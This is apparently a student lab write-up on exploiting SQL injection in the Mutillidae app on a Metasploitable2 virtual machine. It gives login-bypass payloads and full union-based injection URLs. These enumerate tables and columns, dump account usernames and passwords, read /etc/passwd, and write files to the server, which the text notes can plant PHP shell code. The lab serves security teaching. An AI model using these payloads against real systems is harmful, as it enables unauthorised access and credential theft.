# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/dc1534a8-a4b5-4b71-b5f2-19eabeb91224)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/c60b4dcb-19c8-4f88-b73e-7717d76fb16d)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/28df3c42-94db-4a13-b23c-ef8a31577856)
Click on the menu Login/Register and register for an account
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/bc0ed506-0996-4fb4-80ff-277a06b9d301)
Click on the link “Please register here”
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/13ea5743-e5f2-41eb-ad8b-ba099568a188)
Click on “Create Account” to display the following page:
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/091cdb28-fc1b-4b8a-9da3-a26300f79d6d)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/b6ec641a-00d1-4b59-a7dc-cc31dae011c4)
Click “Login”. The logged in page will show as below:
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/f508553c-9cbe-4170-b5ca-b0db41f2d1cb)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/7097bc23-1568-4b60-95d6-f2ca1fbbcf37)
Click the login button and you will see it enter into the administrator page.
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/7c517ca4-0b50-4707-9905-a2bb590d2041)

Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/319868bc-1676-4eb0-ac12-0d25ed23da6c)

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/b55e6747-0e06-4000-881c-d765f593e128)

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/dcbe8883-d280-4dfd-9d20-a442c575d9bc)

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/97eac32b-de2c-4502-a1a9-f527abcf3200)

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/aa54b87f-ebd8-4657-a044-4fbfe0f82626)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/e9485660-493a-451a-bc69-6de2ad558069)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/99c6400d-7f39-459d-9cd6-4c9b4b62f036)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/821a8316-2e61-4ef6-ab9b-72c6b31d6435)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/d3c5d2c0-8ef8-4e6e-aeda-3cc3be51551b)
As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/f24f68ad-2173-437d-a7d1-c417e2f43506)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/4bbe2a77-a5e9-47e8-b6c7-a9e8fc540bea)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/bda2245a-db70-4fe0-8661-4668715d20ac)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/da8d0705-adbd-487e-876c-9a140ee46ed0)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/29947b36-0dcd-4b92-a603-c5e436d907da)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/ef09b29c-0b4f-48e1-ae13-68d9846b72b9)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/c7d08d18-3317-4d15-bd4b-b10f159b67ed)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/293b5568-9c34-45ea-9ac8-eb91373dbd64)

Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Poojithamanohar/sqlinjection/assets/119423592/74d0a529-8320-4685-abc6-5d7c24628bfc)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
